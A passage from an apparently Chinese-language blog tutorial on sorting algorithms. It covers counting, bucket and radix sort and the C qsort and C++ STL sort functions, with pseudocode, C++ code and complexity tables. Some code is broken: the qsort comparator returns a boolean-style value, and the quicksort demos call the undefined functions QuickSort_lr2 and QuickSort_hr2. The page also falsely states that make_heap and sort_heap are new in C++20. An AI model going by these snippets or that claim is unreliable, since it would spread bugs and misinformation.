(<span class="type">int</span>*)<span class="built_in">malloc</span>(n*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">for</span> (i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        B[C[A[i]]<span class="number">-1</span>] = A[i];</span><br><span class="line">        C[A[i]]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        A[i] = B[i];</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="built_in">free</span>(C);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="countingsort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CountingSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123; </span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> k = A[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; e : A)</span><br><span class="line">        k = <span class="built_in">max</span>(k, e);</span><br><span class="line">    <span class="function">vector&lt;<span class="type">unsigned</span>&gt; <span class="title">C</span><span class="params">(k+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; e : A)</span><br><span class="line">        C[e]++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= k; i++)</span><br><span class="line">        C[i] += C[i<span class="number">-1</span>];</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">B</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        B[C[A[i]]<span class="number">-1</span>] = A[i]; </span><br><span class="line">        C[A[i]]--;           </span><br><span class="line">    &#125;                        </span><br><span class="line">    A = B;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h2><p>桶排序起源于<a href="#%E8%AE%A1%E6%95%B0%E6%8E%92%E5%BA%8F"><strong>计数排序</strong></a>，计数排序分离原始数据中的每个元素，然后再放回正确的位置，桶排序也做同样的事情，将元素放到桶中过程实质上执行了一个<code>K</code>路比较，这比简单比较类算法更为强大。<strong>当每桶中的元素数量为1时，桶排序退化为计数排序。</strong></p>
<p>桶排序要求输入数据出现的概率<strong>均匀分布</strong>在<code>[0,1)</code>区间上：</p>
<ol>
<li>将此区间划分为<code>k</code>个大小相等的子区间（也称为桶），使得各桶之间是有序的。</li>
<li>遍历输入数据分别放到各个桶中，然后对每个桶中的元素进行排序。</li>
<li>遍历每个桶，依次将桶中元素取回原始数据中。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0k --- 1k --- 2k --- n   A:原始数据</span><br><span class="line">B1     B2     B3         B:桶</span><br><span class="line">当A[n]占用区间范围为[0,25)、 k=5时， B1[0..4] B2[5..9]   ... B5[20..24]</span><br><span class="line">当A[n]占用区间范围为[0,100)、k=10时，B1[0..9] B2[10..19] ... B10[90..99]</span><br></pre></td></tr></table></figure>

<p>对于输入数据<code>A[n]</code>，元素<code>A[i]</code>占用的区间范围为<code>[p,r+1)</code>，当桶数量为<code>k</code>时：</p>
<ul>
<li>每桶中的元素数量<code>m=ceil((double)(r-p+1)/k)</code>；</li>
<li>每个元素<code>A[i]</code>对应的桶<code>B[j]</code>：<code>j=floor((A[i]-p)/m)</code>;</li>
</ul>
<p>当<code>p,r</code>值越小、<code>n</code>越大时，相对比较类排序算法，桶排序的优势越明显。</p>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">$n&lt;&lt;2^k$</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">BucketSort</td>
<td align="left">-</td>
<td align="left">n+k</td>
<td align="left">n+k</td>
<td align="left">n+k</td>
<td align="left">yes</td>
<td align="left">yes</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="bucketsort"><ul class="nav-tabs"><li class="tab active"><a href="#bucketsort-1">Pseudo</a></li><li class="tab"><a href="#bucketsort-2">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bucketsort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">BucketSort(A[<span class="type">n</span>], k)</span><br><span class="line">    p: min(A[<span class="number">1</span>], A[<span class="number">2</span>], ... A[<span class="type">n</span>])</span><br><span class="line">    <span class="built_in">r</span>: max(A[<span class="number">1</span>], A[<span class="number">2</span>], ... A[<span class="type">n</span>])</span><br><span class="line">    m: ceil((double)(<span class="built_in">r</span><span class="literal">-p</span>+<span class="number">1</span>)/k)</span><br><span class="line">    B[<span class="type">k</span>]: array[<span class="type">empty</span> <span class="type">list</span>]</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> to n</span><br><span class="line">        j = floor((A[<span class="type">i</span>]<span class="literal">-p</span>)/m)</span><br><span class="line">        B[<span class="type">j</span>] &lt;- A[<span class="type">i</span>]</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> to k</span><br><span class="line">        <span class="comment"># 也可以使用冒泡排序等</span></span><br><span class="line">        InsertSort(B[<span class="type">i</span>])</span><br><span class="line">    A = Concat(B[<span class="number">1</span>], B[<span class="number">2</span>], ... B[<span class="type">k</span>])</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bucketsort-2"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BucketSort_k</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();          </span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">2</span>)                 </span><br><span class="line">        <span class="keyword">return</span>;                </span><br><span class="line">    <span class="type">int</span> p = A[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> r = A[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; e : A) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p &gt; e)</span><br><span class="line">            p = e;</span><br><span class="line">        <span class="keyword">if</span> (r &lt; e)</span><br><span class="line">            r = e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> m = <span class="built_in">ceil</span>((<span class="type">double</span>)(r-p+<span class="number">1</span>)/k);</span><br><span class="line">    vector&lt;list&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">B</span>(k);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; e : A) &#123;</span><br><span class="line">        <span class="type">int</span> j = <span class="built_in">floor</span>((e-p)/m);</span><br><span class="line">        <span class="keyword">auto</span>&amp; L =  B[j];</span><br><span class="line">        L.<span class="built_in">push_back</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; L : B) &#123;</span><br><span class="line">        L.<span class="built_in">sort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; L : B) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; e : L) &#123;</span><br><span class="line">            A[i++] = e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;       </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BucketSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">BucketSort_k</span>(A, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h2><p>1887年<code>Herman Hollerith</code>研究制表机发明此算法。1923年作为一种对穿孔卡片进行排序的方法普遍使用。<br>基数排序常应用于字符串和整数数据，数据中的每一个元素，都可以看成由一定长度的位组合而成，从左向右按位遍历元素时称为按最高有效位（<code>MSD, Most significant digit</code>）遍历，反之称为按最低有效位（<code>LSD, Least significant digit</code>）遍历，每一次遍历时需使用一种稳定排序算法（常使用<a href="#%E6%A1%B6%E6%8E%92%E5%BA%8F"><strong>桶排序</strong></a>或<a href="#%E8%AE%A1%E6%95%B0%E6%8E%92%E5%BA%8F"><strong>计数排序</strong></a>）按当前位对所有数据进行排序，待遍历完所有位后即获得有序数据。</p>
<p>对于输入数据<code>A[n]</code>，每一个元素都可以由<code>d</code>位构成，按最低有效位（<code>LSD</code>）基于桶排序进行基数排序时：</p>
<ol>
<li>按位分析输入数据，使得元素的每一位的值都唯一对应到桶，从而确定桶数量<code>k</code>;</li>
<li>从第<code>d</code>位依次遍历至第<code>1</code>位，每次遍历时都按照当前位的值将各元素放到桶中，完毕后再将各桶中元素取回值原始数据中；</li>
<li>由于进行第<code>i</code>位桶排序时，各元素已经是按照第<code>i+1</code>位排序的，当<code>i</code>减少为<code>1</code>时，最后一次桶排序后原始数据即为有序的。</li>
</ol>
<p>基数排序对<strong>整数排序</strong>非常快，通常快于更通用的比较类排序算法。</p>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">$n&lt;&lt;2^k$</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">LSDRadixSort</td>
<td align="left">n</td>
<td align="left">$n·{k \over d}$</td>
<td align="left">$n·{k \over d}$</td>
<td align="left">$n+2^d$</td>
<td align="left">yes</td>
<td align="left">no</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">MSDRadixSort</td>
<td align="left">-</td>
<td align="left">$n·{k \over d}$</td>
<td align="left">$n·{k \over d}$</td>
<td align="left">$n+2^d$</td>
<td align="left">yes</td>
<td align="left">no</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="radixsort"><ul class="nav-tabs"><li class="tab active"><a href="#radixsort-1">Pseudo</a></li><li class="tab"><a href="#radixsort-2">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="radixsort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">RadixSort(A[<span class="type">n</span>], d)</span><br><span class="line">    <span class="comment"># 确定桶数量</span></span><br><span class="line">    k: <span class="number">10</span>/integer or <span class="number">256</span>/ascii or <span class="number">2</span>/binary</span><br><span class="line">    B[<span class="type">k</span>]: array[<span class="type">empty</span> <span class="type">list</span>]</span><br><span class="line">    <span class="comment"># 按LSD进行基数排序</span></span><br><span class="line">    <span class="keyword">for</span> i = d to <span class="number">1</span></span><br><span class="line">        <span class="comment"># 元素按位放到各桶中</span></span><br><span class="line">        <span class="keyword">for</span> j = <span class="number">1</span> to n</span><br><span class="line">            B[<span class="type">A</span>[<span class="type">j</span>][<span class="type">i</span>]] &lt;- A[<span class="type">j</span>]</span><br><span class="line">        <span class="comment"># 各桶中元素取回至原始数据</span></span><br><span class="line">        A = Concat(B[<span class="number">1</span>], B[<span class="number">2</span>], ... B[<span class="type">k</span>])</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="radixsort-2"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RadixSort_b</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> k = <span class="number">10</span>;</span><br><span class="line">    vector&lt;list&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">B</span>(k);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = d<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; e : A) &#123;</span><br><span class="line">            <span class="type">int</span> pos = e/(<span class="type">int</span>)<span class="built_in">pow</span>(<span class="number">10</span>, d-i<span class="number">-1</span>)%<span class="number">10</span>;</span><br><span class="line">            B[pos].<span class="built_in">push_back</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; L : B) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; e : L)</span><br><span class="line">                A[idx++] = e;</span><br><span class="line">            L.<span class="built_in">clear</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RadixSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">RadixSort_b</span>(A, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="C"><a href="#C" class="headerlink" title="C"></a>C</h1><ul>
<li><code>qsort</code> 不保证稳定性，使用<a href="#%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F"><strong>快速排序</strong></a>。</li>
</ul>
<div class="tabs" id="c_sort"><ul class="nav-tabs"><li class="tab active"><a href="#c_sort-1">qsort</a></li></ul><div class="tab-content"><div class="tab-pane active" id="c_sort-1"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">QCompare</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *p1, <span class="type">const</span> <span class="type">void</span> *p2)</span> &#123;</span><br><span class="line">    <span class="type">int</span> n1, n2;</span><br><span class="line">    n1 = *(<span class="type">int</span>*)p1;</span><br><span class="line">    n2 = *(<span class="type">int</span>*)p2;</span><br><span class="line">    <span class="keyword">return</span> n1 &gt; n2; <span class="comment">// 从小到大</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">QSortDemo</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    qsort(A, n, <span class="keyword">sizeof</span>(<span class="type">int</span>), QCompare);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="C-STL"><a href="#C-STL" class="headerlink" title="C++ (STL)"></a>C++ (STL)</h1><ul>
<li><code>sort</code><br>不保证算法稳定性，在<code>HP</code>和<code>Microsoft</code>的实现中使用<a href="#%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F"><strong>快速排序</strong></a>算法。当快排时每次分区选择的支点元素有序位置总是严重偏向一侧时，分区次数增加，时间复杂度越趋近最坏情况$n^2$，此时会切换为<a href="#%E5%A0%86%E6%8E%92%E5%BA%8F"><strong>堆排序</strong></a>算法，以将最坏情况下的时间复杂度降低至$n\log n$。</li>
<li><code>stable_sort</code><br>保证算法稳定性，在<code>HP</code>和<code>Microsoft</code>的实现中使用混合<a href="#%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F"><strong>归并排序</strong></a>算法。使用<a href="#%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F"><strong>插入排序</strong></a>算法创建由32个元素组成的有序组，然后利用<strong>自底向上的归并排序</strong>算法对有序组进行合并。</li>
<li><code>partial_sort</code><br>在<code>[p,r]</code>的元素范围内，只将前面的元素<code>[p,q&lt;=r)</code>中的元素排列为有序状态（有序是相对<code>[p,r]</code>中的所有元素的）。</li>
<li><code>partial_sort_copy</code><br>在<code>A[p1,r1]</code>和<code>B[p2,r2]</code>中同时搜索，寻找前<code>r2-p2+1</code>个元素放到<code>B</code>中。</li>
<li><code>partition</code><br>将<code>A[p,r]</code>按一定条件分割为两半<code>L[p,q)</code>和<code>R[q,r]</code>（类似快排的<code>Hoare</code>分区算法）。</li>
<li><code>make_heap/sort_heap</code><br><code>c++20</code>新增，分别对应<a href="#%E5%A0%86%E6%8E%92%E5%BA%8F"><strong>堆排序</strong></a>的两个步骤，<code>make_heap</code>将容器构造为堆，<code>sort_heap</code>将堆转换为有序数据。</li>
</ul>
<div class="tabs" id="c++_sort"><ul class="nav-tabs"><li class="tab active"><a href="#c++_sort-1">sort</a></li><li class="tab"><a href="#c++_sort-2">stable_sort</a></li><li class="tab"><a href="#c++_sort-3">partial_sort</a></li><li class="tab"><a href="#c++_sort-4">partial_sort_copy</a></li><li class="tab"><a href="#c++_sort-5">partition</a></li><li class="tab"><a href="#c++_sort-6">heap_sort</a></li></ul><div class="tab-content"><div class="tab-pane active" id="c++_sort-1"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SortDemo</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 从小到大</span></span><br><span class="line">    <span class="built_in">sort</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>(), <span class="built_in">less</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">    <span class="built_in">sort</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>(), [](<span class="type">int</span> a, <span class="type">int</span> b) &#123; <span class="keyword">return</span> a &lt; b; &#125;);</span><br><span class="line">    <span class="comment">// 从大到小</span></span><br><span class="line">    <span class="built_in">sort</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="c++_sort-2"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StableSortDemo</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123; </span><br><span class="line">    <span class="comment">// 从小到大</span></span><br><span class="line">    <span class="built_in">stable_sort</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>(), <span class="built_in">less</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">    <span class="built_in">stable_sort</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>(), [](<span class="type">int</span> a, <span class="type">int</span> b) &#123; <span class="keyword">return</span> a &lt; b; &#125;);</span><br><span class="line">    <span class="comment">// 从大到小</span></span><br><span class="line">    <span class="built_in">stable_sort</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="c++_sort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PartialSortDemo</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123; </span><br><span class="line">    <span class="comment">// 所有元素中找到前3个最小元素</span></span><br><span class="line">    <span class="built_in">partial_sort</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">begin</span>()+<span class="number">3</span>, A.<span class="built_in">end</span>());</span><br><span class="line">    <span class="comment">// 所有元素中找到前3个最大元素</span></span><br><span class="line">    <span class="built_in">partial_sort</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">begin</span>()+<span class="number">3</span>, A.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="c++_sort-4"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PartialSortCopyDemo</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, vector&lt;<span class="type">int</span>&gt;&amp; B)</span> </span>&#123; </span><br><span class="line">    <span class="comment">// 在A和B组成的元素中找到前B.size个最小元素</span></span><br><span class="line">    <span class="built_in">partial_sort_copy</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>(), B.<span class="built_in">begin</span>(), B.<span class="built_in">end</span>());</span><br><span class="line">    <span class="comment">// 在A和B组成的元素中找到前B.size个最大元素</span></span><br><span class="line">    <span class="built_in">partial_sort_copy</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>(), B.<span class="built_in">begin</span>(), B.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="c++_sort-5"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PartitionDemo</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123; </span><br><span class="line">    <span class="comment">// 将A中元素分区，使得L半边为偶数，R半边为奇数</span></span><br><span class="line">    <span class="built_in">partition</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>(), [](<span class="type">int</span> x) &#123; <span class="keyword">return</span> x%<span class="number">2</span>==<span class="number">0</span>; &#125;);</span><br><span class="line">    <span class="built_in">is_partitioned</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>(), [](<span class="type">int</span> x) &#123; <span class="keyword">return</span> x%<span class="number">2</span>==<span class="number">0</span>; &#125;) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSort_lr</span><span class="params">(vector&lt;<span class="type">int</span>&gt;::iterator p, vector&lt;<span class="type">int</span>&gt;::iterator r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; r) &#123;</span><br><span class="line">        <span class="comment">// 选择最后一个元素作为支点元素pivot</span></span><br><span class="line">        <span class="keyword">auto</span> pivot = <span class="built_in">prev</span>(r);</span><br><span class="line">        <span class="comment">// 根据pivot元素分区为[p,q)和[q,r)（pivot元素不参与分区过程）</span></span><br><span class="line">        <span class="keyword">auto</span> q = <span class="built_in">partition</span>(p, pivot, [pivot](<span class="type">int</span>&amp; x) &#123; <span class="keyword">return</span> x &lt; *pivot; &#125;);</span><br><span class="line">        <span class="comment">// 将pivot元素交换至正确位置</span></span><br><span class="line">        <span class="built_in">iter_swap</span>(pivot, q);</span><br><span class="line">        <span class="comment">// 递归分区[p,pivot)和[pivot+1, r)</span></span><br><span class="line">        <span class="built_in">QuickSort_lr2</span>(p, pivot);</span><br><span class="line">        <span class="built_in">QuickSort_lr2</span>(pivot+<span class="number">1</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSort_hr</span><span class="params">(vector&lt;<span class="type">int</span>&gt;::iterator p, vector&lt;<span class="type">int</span>&gt;::iterator r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; r) &#123;</span><br><span class="line">        <span class="comment">// 选择中间元素作为支点元素pivot（偶数时偏左）</span></span><br><span class="line">        <span class="keyword">auto</span> pivot = *<span class="built_in">next</span>(p, <span class="built_in">distance</span>(p,r)/<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 分区为[p,mid1)都是小于pivot的元素和[mid1,r)</span></span><br><span class="line">        <span class="keyword">auto</span> mid1 = <span class="built_in">partition</span>(p, r, [pivot](<span class="type">int</span>&amp; x) &#123; <span class="keyword">return</span> x &lt; pivot; &#125;);</span><br><span class="line">        <span class="comment">// 再分区一次，确保[mid2,r)都是大于Pivot的元素</span></span><br><span class="line">        <span class="keyword">auto</span> mid2 = <span class="built_in">partition</span>(mid1, r, [pivot](<span class="type">int</span>&amp; x) &#123; <span class="keyword">return</span> x &lt;= pivot; &#125;);</span><br><span class="line">        <span class="built_in">QuickSort_hr2</span>(p, mid1);</span><br><span class="line">        <span class="built_in">QuickSort_hr2</span>(mid2, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> t = <span class="number">1</span>; </span><br><span class="line">    <span class="keyword">switch</span> (t) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">QuickSort_lr</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>()); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="built_in">QuickSort_hr</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>()); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="c++_sort-6"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapSortDemo</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 构建大顶堆</span></span><br><span class="line">    <span class="built_in">make_heap</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>());</span><br><span class="line">    <span class="comment">// 将大顶堆转换为从小到大的数据</span></span><br><span class="line">    <span class="built_in">sort_heap</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>());</span><br><span 